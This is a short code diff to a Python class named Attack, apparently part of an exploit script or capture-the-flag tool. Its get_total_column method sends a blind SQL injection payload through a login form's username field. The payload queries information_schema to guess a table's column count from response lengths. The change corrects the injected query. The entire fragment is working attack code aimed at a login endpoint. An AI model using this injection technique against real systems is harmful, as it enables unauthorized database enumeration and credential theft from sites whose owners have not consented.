@@ -15,7 +15,7 @@ class Attack:
 
     def get_total_column(self) -> int:
         for guess in range(1, 20):
-            p = {"username": f"admin' and (SELECT COUNT(*)={guess} total_columns FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}')#", "password": "<ignore>"}
+            p = {"username": f"admin' and (SELECT COUNT(*)={guess} FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' AND TABLE_NAME='{self.TABLE_NAME}')#", "password": "<ignore>"}
             resp = post(self.URL, data=p)
             if self.DEBUG:
                 print(guess, len(resp.text))
